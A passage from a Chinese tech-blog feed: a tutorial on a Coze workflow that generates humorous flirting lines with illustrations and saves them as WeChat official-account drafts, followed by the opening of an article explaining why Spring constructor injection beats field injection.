                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是吾鳴。专注于分享提升工作与生活效率的工具，无偿分享AI领域相关的精选报告，持续关注AI的前沿动向。</p>
<p>最近我经常会在公众号刷到一类文章，这类文章内容比较简洁，就是短短的10-20句话，但是数据都比较不错。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77b5fcd69eda4688a7f121003ac676bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=vaqPBdJcLT7tnav0mG%2Fu0HgIcwA%3D" alt="" loading="lazy"/></p>
<p>这类文章的主题就是在讲如何与伴侣、暗恋对象等聊天，在显得幽默好笑的同时，又不用显得那么的尴尬。</p>
<p>这些文章并不是长篇大论的在讲大道理，而是通过给人们举实际的例子，直接告诉你应该怎么“撩”，而且句句都是梗，让你看完即便不用，也能得到快乐。</p>
<p>文章非常的简短，只有简单的10-20句话，只需要花个一分钟时间便可以读完，便可学到几句“撩天”的杀手锏，以便在后续的社交场景中可以使用到，所以这类能给人带来快乐和实用技巧的文章，人们都喜欢点击阅读。</p>
<p>经过对这些文章结构的拆解，我发现可以使用扣子来进行一键生成，只要输入文章的主题，便可以自动生成对应的文章草稿。</p>
<p>在开始讲解工作流之前，我们先看看效果，比如我输入“我想你了，暧昧一点怎么说”这么一个主题，工作流经过约一分钟的运行，一篇文章就生成好了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a5fc56d68754d7cb7dfc1287a067c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=TGL9NGCiNs1iTGBpyhW7QJsO0hk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">1. 完整的工作流程</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55e605cfcb70442ebc9c5ccd4256830b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=FTh%2BJfp0DlpmC8wfafItOzxC2g4%3D" alt="" loading="lazy"/></p>
<p>1、撩天文案生成：这一步根据输入的主题、句子数量生成文章的文案。</p>
<p>2、配图绘制：这个步骤会先根据主题生成绘图提示词，然后再根据提示词绘制配图，并将配图合成文章封面图。</p>
<p>3、生成文章草稿：这个步骤先将配图、封面图上传公众号素材库，并对文章进行排版，最后生成草稿。</p>
<h2 data-id="heading-1">2. 工作流详细节点解读</h2>
<h3 data-id="heading-2">2.1. 开始</h3>
<ul>
<li>subject：文章主题，必填</li>
<li>nums：生成句子数量，非必填，默认10个</li>
<li>api_token：插件认证，可后台回复【芝麻开门】联系获取（有条件），必填</li>
<li>app_id：公众号开发者ID，必填</li>
<li>app_secret：公众号开发者密钥，必填</li>
<li>image_location：图片插入文案的位置，非必填，默认5，表示在第5个文案后插入图片</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/288507c4ba7145f9a0abc1df6980e87c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=Jhe6cJfqENtaa2NS33HNFiE%2BZrU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2. 撩天幽默句子生成</h3>
<p>这个节点使用到了扣子官方的大模型节点，用来生成主题对应的梗句，它的参数如下：</p>
<ul>
<li>模型：选择【DeepSeek-V3.1】</li>
<li>输入</li>
</ul>

<ul>
<li>
<ul>
<li>subject：开始 -&gt; subject</li>
<li>nums：开始 -&gt; nums</li>
</ul>
</li>
</ul>

<ul>
<li>输出</li>
</ul>

<ul>
<li>
<ul>
<li>words：梗句列表</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e148c1638d74bc6be350521f2bb7e98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=jZlbL41EPbRtLlKuppvrutKT2Ss%3D" alt="" loading="lazy"/></p>
<ul>
<li>系统提示词，这是个伪提示词，可以看看我往期的文章进行反推——《扣子（Coze）实战：评论区成许愿池，打赏收到手软的“小佛陀”爆款漫画一键直达草稿箱》。</li>
</ul>

<pre><code class="hljs">你是一名脑洞大开的趣味文案巧匠，专攻不同聊天场景的幽默金句创作。
能精准吃透聊天主题的风格调性，不管是暧昧撒娇、霸气狂野还是暖心夸赞，都能拿捏到位。
创作时要灵活玩转谐音梗、反差调侃、夸张比喻等搞笑手法，产出的金句得口语化、接地气，能直接用于日常聊天，每句长度控制在 10-30 字，保证句句有梗不重复。
用户指定数量就按数量产出，没指定就默认生成 10 句，所有金句都要贴合主题、积极健康，杜绝平淡无聊和低俗冒犯的内容。
</code></pre>
<h3 data-id="heading-4">2.3. 绘图提示词</h3>
<p>这个节点使用到了扣子官方的大模型节点，用来生成绘制配图的提示词，它的参数如下：</p>
<ul>
<li>模型：选择【豆包-1.5-Pro-32k】</li>
<li>输入</li>
</ul>

<ul>
<li>
<ul>
<li>subject：开始 -&gt; subject</li>
</ul>
</li>
</ul>

<ul>
<li>输出</li>
</ul>

<ul>
<li>
<ul>
<li>prompt1：配图1提示词</li>
<li>prompt2：配图2提示词</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/735db020c6a44577a165ad50bb8893a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=qg6JESq%2FiQ0jEOM98OFHm%2FzWcdU%3D" alt="" loading="lazy"/></p>
<ul>
<li>系统提示词，这是个伪提示词，可以按照以上方法进行反推。</li>
</ul>

<pre><code class="hljs language-css" lang="css">你是一名专注于治愈系水彩 <span class="hljs-selector-tag">Q</span> 版卡通风格的 AI 绘画提示词创作师，核心工作是根据用户给出的单一主题，产出两个高度对称配对的优质绘图提示词。
创作时要先拆解主题核心元素，构建出镜像、互补或因果呼应的两个对称主体，
同时保证两个提示词全程沿用治愈系水彩插画、<span class="hljs-selector-tag">Q</span> 版大头小身的统一风格，
色彩以马卡龙色系、奶油白、淡粉、浅蓝等柔和色调为主，笔触细腻边缘柔和，
背景选用米白、浅灰等干净浅色，营造温暖治愈氛围。每个提示词都要包含主角的发型、
表情等特征，明确生动的动作，贴合主题的 <span class="hljs-selector-tag">Q</span> 版服饰，以及能和主角互动的场景元素，
还要在构图视觉重心、情绪基调、自然元素分布上形成对称呼应，语言需具体直白，
拒绝写实、暗黑等不符风格的内容，最终以清晰分栏的形式呈现，确保两个提示词主题关联紧密、细节丰富且对称感十足。
</code></pre>
<h3 data-id="heading-5">2.4. 图像生成一</h3>
<p>这个节点用来绘制配图一，使用到了扣子官方的图像生成节点。输入参数的prompt1引用了【绘图提示词】节点输出的prompt1。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff3bb88b822f4a2bb5b7d45a805d943d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=UzwaqUOHIOkyNJJoHEQJpd8C%2FIQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">2.5. 图像生成二</h3>
<p>这个节点使用到了扣子官方的图像生成节点，用来生成配图二，prompt2输入参数引用了【绘图提示词】节点的prompt2参数。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/394726960cbb4467bf469d75f3554b64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=gEmDLtz2HTAFNOpA1BR3lPlYNS4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">2.6. 文章封面图</h3>
<p>这个节点使用到了扣子官方的画板节点，用来将生成好的配图一和配图二合成一张封面图。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bfdebd5bd114573bf78f16d16ed8032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=tSUqawszqz%2BtxVXVXURZK0LXQP4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">2.7. 获取微信公众号接口认证</h3>
<p>这个节点使用到了扣子三方的插件【微信公众号接口】的【get_access_token】工具，用来获取公众号接口认证。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f07e306eaa844998f526f97c1f4e533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=cMiRFmNfBuZjWN4SYw5UcvJjXU0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2.8. 上传图一</h3>
<p>这个节点用来上传配图一到微信公众号素材库中，使用到了三方插件【微信公众号接口】的【wx_upload_image】工具。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88f94de52d02488e9b5c4b0cdef2bf2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=8g5ZpsknWKYNY20ir16QhZ%2BzRSA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">2.9. 上传图二</h3>
<p>这个节点用来上传配图二，和【2.8. 上传图一】使用了相同的插件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f23cbf4d2b544deda853cab5090bdfdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=bHpF2fVjNXmYld7n79fMwn7o8iY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">2.10. 上传封面图</h3>
<p>这个节点用来上传文章封面图，使用了和【2.8. 上传图一】一样的插件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/187985f1a567450d9738620c18902e3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=VWiF4VAluoop7licmoSIC0qT6AE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">2.11. 图片地址转成列表</h3>
<p>这个节点用来将图片地址转成列表，主要是为了适配公众号文章排版插件需要的数据格式。使用到了三方插件【字符串工具合集】的【str_2_list】工具。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc14026916474ebeb83a47d60ab34b5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=wk1rUGSqly32kuaBTxgeHQCikT0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">2.12. 公众号文章排版</h3>
<p>这个节点用来对公众号文章进行排版，生成需要格式的文章，使用到了扣子三方插件【公众号文章模板】的【text_list_with_num_img_layout】工具，它的参数如下：</p>
<ul>
<li>输入</li>
</ul>

<ul>
<li>
<ul>
<li>api_token：开始 -&gt; api_token</li>
<li>text_list：撩天幽默句子 -&gt; text_list</li>
<li>image_location：开始 -&gt; image_location</li>
<li>image_urls：图片地址转成列表 -&gt; str_list</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c50a88dcb9c42c1baf55118b76e3482~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=06RINeG9zErLcd7qQUPwfhp%2FT8Q%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2.13. 添加文章草稿</h3>
<p>这个节点使用到了扣子三方插件【微信公众号接口】的【add_draft】工具，用来生成公众号文章草稿，它的输入参数如下：</p>
<ul>
<li>access_token：获取微信公众号接口认证 -&gt; access_token</li>
<li>content：公众号文章排版 -&gt; article_content_html</li>
<li>thumb_media_id：上传封面图 -&gt; media_id</li>
<li>title：开始 -&gt; subject</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c07cfca55b84aa1bbd35c7c619cb2de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=aN81Zud4281wh55Wq5qc0Ye%2Fd%2FY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">2.14. 结束</h3>
<p>media_id有值说明生成成功，没有值说明失败了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/802084c9fced4b61895180b2dd312b5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=KYAr00qq%2BgAIRsoHg1KQkvGbd%2Fk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-16">3. 总结</h2>
<p>本文主要介绍了如何使用扣子来搭建公众号撩天梗句生成的工作流，撩天梗句是我无意间刷到的一些文章，觉得很有意思，而且阅读数据也非常的不错，因此在本文中介绍了如何使用扣子来一键复刻。</p>
<p>本文的分享就到这里，如果您觉得有收获的话，可以给个一键三连，您的鼓励是吾鳴持续输出的最大动力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f91e485c658451ab1d3d617004be8dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769486251&amp;x-signature=a%2FEbQnKvlKYRpihq2xZtyH0OXBI%3D" alt="" loading="lazy"/></p>
<p>最近实战了一些扣子（Coze）工作流相关的案例，包含小红薯图文生成、爆款视频剪辑、办公提效等扣子案例，内附详细的教程和工作流安装包，感兴趣的朋友可以来个<strong>一键三连（必须动作）</strong> ，文章评论区评论“<strong>扣子案例</strong>”领取（这些案例不包含本文分享的案例，如果需要本文分享的案例安装包可以后台私信我）。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别字段注入：为什么你应该在 Spring 中使用构造器注入]]></title>    <link>https://juejin.cn/post/7596905751110844479</link>    <guid>https://juejin.cn/post/7596905751110844479</guid>    <pubDate>2026-01-19T15:54:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905751110844479" data-draft-id="7596926832913121343" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别字段注入：为什么你应该在 Spring 中使用构造器注入"/> <meta itemprop="keywords" content="后端,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-19T15:54:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天文家"/> <meta itemprop="url" content="https://juejin.cn/user/141198021370855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别字段注入：为什么你应该在 Spring 中使用构造器注入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/141198021370855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天文家
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T15:54:36.000Z" title="Mon Jan 19 2026 15:54:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常的 Spring Boot 开发中，你是否经常这样写代码？</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
}
</code></pre>
<p>看起来简洁、直观，IDE 也能自动补全。但细心的同学可能已经注意到：<strong>IntelliJ IDEA 或其他现代 IDE 会给出一个黄色警告</strong>：</p>
<blockquote>
<p>“Field injection is not recommended.”</p>
</blockquote>
<p>是的，尽管 <code>@Autowired</code> 字段注入在功能上完全可行，但它早已被 Spring 官方和社区视为<strong>反模式（anti-pattern）</strong> 。今天，我们就来深入聊聊：<strong>为什么字段注入不被推荐？以及如何优雅地改用构造器注入？</strong></p>
<hr/>
<h2 data-id="heading-0">一、字段注入的问题：看似方便，实则隐患重重</h2>
<h3 data-id="heading-1">1. <strong>依赖不可变性无法保证</strong></h3>
<p>字段注入要求依赖字段必须是非 <code>final</code> 的，这意味着：</p>
<ul>
<li>依赖可以在运行时被意外修改；</li>
<li>无法利用 <code>final</code> 关键字带来的线程安全性和设计清晰性。</li>
</ul>
<h3 data-id="heading-2">2. <strong>单元测试困难</strong></h3>
<p>当你想为 <code>UserController</code> 编写单元测试时：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ❌ 字段注入下，无法直接传入 mock 对象</span>
<span class="hljs-type">UserController</span> <span class="hljs-variable">controller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserController</span>(); <span class="hljs-comment">// userService 为 null！</span>
</code></pre>
<p>你不得不借助反射、Spring TestContext 或 Mockito 的 <code>@InjectMocks</code>，增加了测试复杂度。</p>
<h3 data-id="heading-3">3. <strong>容易引发 NPE（空指针异常）</strong></h3>
<p>如果某个类被手动 <code>new</code> 出来（比如在工具类或非 Spring 管理的上下文中），所有 <code>@Autowired</code> 字段都是 <code>null</code>，直到运行时才暴露问题。</p>
<h3 data-id="heading-4">4. <strong>隐藏了真实依赖</strong></h3>
<p>从类的外部看，你无法一眼看出它依赖哪些 Bean。而构造器注入让依赖<strong>显式化</strong>，符合“显式优于隐式”的设计哲学。</p>
<h3 data-id="heading-5">5. <strong>助长“上帝类”倾向</strong></h3>
<p>因为字段注入太“方便”，开发者容易无节制地注入十几个 Service，导致类职责不清、难以维护。</p>
<hr/>
